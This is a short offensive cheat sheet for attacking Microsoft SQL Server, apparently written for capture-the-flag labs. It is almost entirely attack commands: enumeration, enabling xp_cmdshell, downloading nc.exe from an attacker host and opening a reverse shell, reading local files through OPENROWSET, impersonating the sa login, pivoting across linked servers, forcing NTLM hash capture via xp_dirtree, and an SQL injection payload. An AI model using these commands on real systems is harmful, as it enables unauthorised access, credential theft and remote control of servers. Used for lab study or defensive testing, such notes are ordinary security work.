---
title: mssql
---

# mssql


- enumeration 
    - `nmap -Pn -sV -sC -p1433 $ip`
- impacket `python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py <username>@$ip -windows-auth`
    - `enable_xp_cmdshell`
        - `xp_cmdshell whoami`
- sqsh
    - `sqsh -S 10.129.20.13 -U username -P Password123`
    - `-h` disable headers for cleaner look
    - local account `sqsh -S $ip -U .\\MSSQLSVC -P princess1`
- sqlcmd
    - win `sqlcmd -S 10.129.20.13 -U username -P Password123`
    - `-y 30 -Y 30` shows better output but may impact performance
- cmdss
    - may require `GO` to execute
    - list databases `SELECT name, database_id, create_date FROM sys.databases;`
    - list tables `SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES`
    - read local files `SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`
    - impersonate
        - find users`SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
        - `EXECUTE AS LOGIN = 'sa'`
    - linked servers `SELECT srvname, isremote FROM sysservers`
        - `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`
- xp_cmdshell
    - `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.10:8080/nc.exe -outfile nc.exe"`
    - `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.14.10 443"` 
- capture hashes
    - setup responder
    - `EXEC master..xp_dirtree '\\10.10.110.17\share\'`
    - `EXEC master..xp_subdirs '\\10.10.110.17\share\'`
- sql injection
    - comment `#` or `--`
    - `admin' or 1=1 # - --`